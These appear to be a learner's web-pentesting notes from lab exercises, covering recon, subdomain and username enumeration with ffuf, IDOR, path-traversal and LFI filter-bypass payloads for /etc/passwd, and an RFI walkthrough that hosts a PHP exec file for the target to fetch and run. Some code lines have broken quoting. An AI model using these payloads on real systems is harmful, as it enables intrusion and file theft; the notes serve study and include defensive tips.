## Identifying Framework By Looking up FavIcon
Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer doesn't replace this with a custom one, this can give us a clue on what framework is in use.

If you find the `favicon`, you can md5 hash it and look it up on OWASP favicon database:
```sh
$curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
```
- Take the md5sum and find the corresponding md5sum hash to get the framework this is using.
- Here is the link to OWASP database: https://wiki.owasp.org/index.php/OWASP_favicon_database 


## Sitemap.xml
- Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.

## Google-hacking (not actually, but utilizing tools)
<table border="1" style="border-collapse: collapse; width: 100%;">
        <thead>
            <tr>
                <th>Filter</th>
                <th>Example</th>
                <th>Description</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>site</td>
                <td>site:tryhackme.com</td>
                <td>Returns results only from the specified website address.</td>
            </tr>
            <tr>
                <td>inurl</td>
                <td>inurl:admin</td>
                <td>Returns results that have the specified word in the URL.</td>
            </tr>
            <tr>
                <td>filetype</td>
                <td>filetype:pdf</td>
                <td>Returns results which are a particular file extension.</td>
            </tr>
            <tr>
                <td>intitle</td>
                <td>intitle:admin</td>
                <td>Returns results that contain the specified word in the title.</td>
            </tr>
        </tbody>
    </table>

```
site:*.tryhackme.com -site:www.tryhackme.com
```
- Explanation:
    - `site:*.tryhackme.com`: This restricts the search to subdomains of tryhackme.com.
    - `site:www.tryhackme.com`: The minus sign (-) excludes results from `www.tryhackme.com`.

## DNS Bruteforce
- dnsrecon -t brt -d acmeitsupport.thm

## Domain search (using sublist3r)
```
./sublist3r.py -d acmeitsupport.thm
```

## ffuf
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.179.170
```
- The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.

#### To filter out the useless valid response, we can run
```
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.179.170 -fs {size}
 ```

- Where the `{size}` is the value of the unwanted domain's file size.
    - For example, if we get file sizes of `2395`, then we can filter out `2395` by using the command `-fs 2395` 

### Username enumeration by looking for "username already exists"
- If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.


```sh
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.231.148/customers/signup -mr "username already exists"
```
In the above example, the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type so the web server knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.

- The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.


Note 
- The $_REQUEST superglobal in PHP is a combination of:
    - $_GET: Data from the query string (e.g., ?email=robert%40acmeitsupport.thm).
    - $_POST: Data sent in the body of the POST request (e.g., email=attacker@hacker.com).
    - $_COOKIE: Data sent via browser cookies.
    <br>
    <br>
* `When the same key is present in both $_GET and $_POST, $_POST takes precedence over $_GET in $_REQUEST.`


## Cookie tempering
We can mess around with cookies and might be able to access privilege features.

### Hashing
    - https://crackstation.net/ (ascii to hash converter)

### Encoding
    - Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible.

## Wayback Machine
- Allows you to see the snapshot of the website by each day (going back up to 1990s)
- https://web.archive.org/web

## Wordlist
- https://github.com/danielmiessler/SecLists 

## Insecure Direct Object Reference (IDOR) vulnerability
- This is an type of access control vulnerability.
- This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.
- `base64` is the common type of encoding used by websites
- If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.
    - For example, if person's `A` order number is 123456. When person `B` looks up order number 123456 and see that it's person `A`'s order, then this is IDOR vulnerability

## File inclusion

### Path traversal | dot-dot-slash attack
- file_get_contents can cause vulnerability in php

### Local File Inclusion (LFI)
- LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications

#### Null byte(%00 || 0x00) and current directory(/.) trick
1. NULL byte trick
    - Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

    - By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:<br/>

    url:
    ```url
    www.deez.php?file=../../../etc/passwd%00
    ```
    php:
    ```php
    include("languages/../../../../../etc/passwd%00").".php")
    ```
    NOTE: the %00 trick is fixed and `not working with PHP 5.3.4 and above`.
2. Similarly, instead of adding `%00`, we can add `/.`.

Why would this work tho?
- Maybe because the dev is looking for `../../../etc/passwd`
```php
if (strpos($lang, '/etc/passwd') !== false) {
    die('Access denied!');
}
```
Us passing extra character that does not make any difference in effect will bypass the error / vulnerability check.

3. In order to fight this, the devs can remove / filter out `../` before passing it to backend server. 

    - For example:
        we input `www.deez.php?file=../../../etc/passwd%00`. But the server got this:
        `www.deez.php?file=/etc/passwd%00`.

    As a pen tester, how can we fight this?
    We can do `....//` to go around this problem. 

    How would this resolve it?
    `www.deez.php?file=....//....//....//etc/passwd%00` -- rm `../` --> `www.deez.php?file=../../../etc/passwd%00`.

    If this gets sent to the server, then we get the password! LOL

### Remote File Inclusion (RFI)
- Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. 
- One requirement for RFI is that the `allow_url_fopen` option needs to be on
- The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
    1. Sensitive Information Disclosure
    2. Cross-site Scripting (XSS)
    3. Denial of Service (DoS)
- An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

#### How to do this easily?
First write a txt(just simple and stupid for now. revshell later):
```sh
echo "<?php echo exec("ls /");?>" > deez.txt
```

you can locally run a webserver using python 3:
```sh
python3 -m http.server 9000
```

at your public ip `address:9000`, you will be hosting all your file. Now you can make post request 
```
curl -X POST -d "file=http://{ip.address.goes.here}:9000/deez.txt"
```

Then it will execute the php we made!


Tips for the devs:

1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.

